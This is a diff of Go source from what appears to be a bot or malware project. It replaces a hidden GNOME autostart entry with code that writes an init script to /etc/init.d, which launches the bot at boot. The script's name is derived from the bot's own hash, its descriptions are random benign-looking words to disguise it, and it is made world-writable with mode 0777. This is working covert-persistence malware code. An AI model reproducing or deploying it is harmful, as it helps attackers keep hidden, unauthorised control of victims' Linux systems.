@@ -3,75 +3,104 @@ package main
 import (
 	"fmt"
 	"os"
-	"strings"
+	"time"
 )
+
+// scriptNameBySelfHash generates a file name based on the bot's hash.
+func scriptNameBySelfHash() (string, error) {
+	// Hash of the bot's executable.
+	hash, err := hashSelf()
+	if err != nil {
+		return "", err
+	}
+
+	return randomPopularWordBySeed(integersFromString(hash)+512) + "_" + randomPopularWordBySeed(integersFromString(hash)+1024), nil
+}
 
 // checkIfPersisted returns true if it recognizes that the bot is already persistent within the environment.
 func checkIfPersisted() bool {
 	switch osDetails().Os {
 	case "linux":
-		workdir, err := os.Getwd()
+		scriptName, err := scriptNameBySelfHash()
 		if err != nil {
-			fmt.Println(err.Error())
 			return false
 		}
 
-		if strings.HasSuffix(workdir, "autostart") {
-			return true
+		_, err = os.Stat("/etc/init.d/" + scriptName)
+		if err != nil {
+			// We cannot make via LSBInitScripts.
+			return false
 		}
+
+		return true
 	}
 
 	return false
 }
 
 // persist returns true if the executable was persisted within the environment.
-func persist() bool {
+func persist() error {
 	switch osDetails().Os {
 	case "linux":
-		// User's home folder.
-		homeDir, err := os.UserHomeDir()
-		if os.IsNotExist(err) {
-			fmt.Println(err.Error())
-			return false
-		}
-		autoStartPath := homeDir + "/.config/autostart"
-
-		// Check if we can persist on Gnome.
-		_, err = os.Stat(autoStartPath)
-		if os.IsNotExist(err) {
-			fmt.Println(err.Error())
-			return false
-		}
-
 		executablePath, err := os.Executable()
 		if err != nil {
-			fmt.Println(err.Error())
-			return false
+			// Couldn't get the full path of the bot's executable.
+			return err
 		}
 
-		desktopEntry := "[Desktop Entry]"
-		desktopEntry += "\nVersion=1.0"
-		desktopEntry += "\nName=" + randomPopularWord()
-		desktopEntry += "\nGenericName=" + randomPopularWord()
-		desktopEntry += "\nComment=" + randomPopularWord()
-		desktopEntry += "\nExec=" + executablePath
-		desktopEntry += "\nIcon=redshift"
-		desktopEntry += "\nTerminal=false"
-		desktopEntry += "\nType=Application"
-		desktopEntry += "\nCategories=Utility;"
-		desktopEntry += "\nStartupNotify=true"
-		desktopEntry += "\nHidden=true"
-		desktopEntry += "\nX-GNOME-Autostart-enabled=true"
+		scriptContent := "#! /bin/sh"
+		scriptContent += "\n### BEGIN INIT INFO"
+		scriptContent += "\n# Provides:          " + randomPopularWord()
+		scriptContent += "\n# Required-Start:    $local_fs"
+		scriptContent += "\n# Required-Stop:     $local_fs"
+		scriptContent += "\n# Default-Start:     2 3 4 5"
+		scriptContent += "\n# Default-Stop:"
+		scriptContent += "\n# Short-Description: "
+		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()) + " "
+		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-2) + " "
+		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-4) + " "
+		scriptContent += randomPopularWordBySeed(time.Now().UnixNano() - 6)
+		scriptContent += "\n# Description:       "
+		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-8) + " "
+		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-16) + " "
+		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-32) + " "
+		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-64) + " "
+		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-128) + " "
+		scriptContent += randomPopularWordBySeed(time.Now().UnixNano() - 256)
+		scriptContent += "\n### END INIT INFO"
+		scriptContent += "\n\n../.." + executablePath
 
-		// Write the desktop entry file.
-		f, err := os.Create(autoStartPath + "/" + randomPopularWord() + ".desktop")
+		fmt.Println(scriptContent)
+
+		_, err = os.Stat("/etc/init.d")
 		if err != nil {
-			fmt.Println(err.Error())
+			// We cannot make via LSBInitScripts.
+			return err
 		}
-		f.WriteString(desktopEntry)
 
-		return true
+		scriptName, err := scriptNameBySelfHash()
+		if err != nil {
+			// Failed to generate the start up script's name.
+			return err
+		}
+		scriptPath := "/etc/init.d/" + scriptName
+
+		// Create our start up script.
+		scriptFile, err := os.Create(scriptPath)
+		if err != nil {
+			// Failed to create the script file.
+			return err
+		}
+		scriptFile.WriteString(scriptContent)
+
+		if err := os.Chmod(scriptPath, 0777); err != nil {
+			// We're unable to make the script executable.
+			return err
+		}
+
+		return nil
+
+	default:
+		return nil
 	}
-
-	return false
 }
